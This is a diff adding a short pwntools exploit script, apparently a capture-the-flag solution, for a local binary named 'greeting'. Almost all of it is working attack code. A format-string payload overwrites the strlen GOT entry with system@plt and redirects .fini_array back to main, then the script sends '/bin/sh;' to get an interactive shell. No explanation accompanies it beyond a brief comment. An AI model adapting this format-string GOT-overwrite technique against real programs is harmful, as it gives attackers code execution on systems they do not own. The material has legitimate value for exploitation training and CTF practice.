@@ -1,0 +1,33 @@
+from pwn import *
+
+# overwrite the GOT of any function to system.plt (if system had been resolved) also can call system_func
+# this challenge is POC
+
+p = process("./greeting")
+e = ELF("./greeting")
+'''
+p = gdb.debug("./greeting", gdbscript = 
+set follow-fork-mode parent
+set follow-exec-mode same
+b *main + 98
+)
+'''
+
+
+fini_array = 0x8049934
+main = 0x080485ed
+strlen_got = e.got['strlen']
+system_plt = e.plt['system']
+
+s = "Nice to meet you, "
+
+payload = b"cc"
+payload += f"%{((system_plt >> 16) & 0xffff) - len(s) - 2}c%23$hn".encode()
+payload += f"%{(system_plt & 0xffff) - ((system_plt >> 16) & 0xffff)}c%21$hn".encode()
+payload += f"%{(main & 0xffff) - (system_plt & 0xffff)}c%22$hn".encode()
+payload += p32(strlen_got) + p32(fini_array) + p32(strlen_got + 2)
+p.sendlineafter(b"name... ", payload)
+
+p.sendlineafter(b"name... ", b"/bin/sh;")
+
+p.interactive()
